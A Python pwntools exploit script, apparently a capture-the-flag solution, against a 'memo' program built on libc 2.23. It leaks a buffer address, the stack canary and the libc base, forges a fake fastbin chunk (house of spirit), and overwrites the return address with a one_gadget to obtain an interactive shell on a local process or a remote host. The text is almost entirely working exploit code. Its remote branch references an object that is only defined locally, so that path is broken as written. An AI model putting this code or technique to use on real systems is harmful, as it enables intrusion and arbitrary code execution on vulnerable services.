from pwn import *

#context.log_level = 'debug'

def alloc(data, done='yes'):
    r.sendlineafter('> ', '1')

    #raw_input()
    r.sendafter('Data: ', data)

    r.sendafter('] ', done)

def show(lenght):
    r.sendlineafter('> ', '2')
    r.recvuntil('Data: ')
    r.recv(lenght)
    return u64(r.recvline().strip()[:8].ljust(8, '\x00'))

def out(done='yes\x00'):
    r.sendlineafter('> ', '1')
    r.sendafter('Data: ', 'A'*0x28+'\x00')
    r.sendafter('] ', done)
    r.sendlineafter('> ', '4')
    r.sendafter('] ', done)

def giveup(data):
    r.sendlineafter('> ', '4')
    r.sendafter('] ', data)

def delete():
    r.sendlineafter('> ', '3')

def main():
    alloc('A'*0x20)
    buf = show(0x20) - 0x110
    log.success("Buffer: 0x{:x}".format(buf))

    alloc('B'*(0x28+1))
    canary = show(0x28) - ord('B')
    log.success("Canary: 0x{:x}".format(canary))
    giveup('no'.ljust(24,'\x00')+p64(memo.got['puts']))
    libc = show(0) - elf.symbols['puts']
    log.success("Libc: 0x{:x}".format(libc))

    # house of spirit
    exp = 'no\x00'.ljust(8, 'C')
    exp += p64(0x20)
    exp += p64(0)
    exp += p64(buf+0x10)
    exp += p64(0)
    exp += p64(0x1234)
    giveup(exp)
    delete()
    #raw_input()    # fastbin

    alloc('D\x00', 'no\x00')
    one_gadget = 0xf1117
    r.sendafter('Data: ', '\x00'*24+p64(canary)+'EEEEEEEE'+p64(libc+one_gadget))

    out()

    r.interactive()

if __name__ == '__main__':
    elf = ELF('./libc-2.23.so')
    if len(sys.argv) > 1:
        r = remote('159.203.116.12', 8888)
    else:
        memo = ELF('./memo')
        r = process('./memo',env={'LD_PRELOAD':'./libc-2.23.so'})
        #raw_input()
    main()

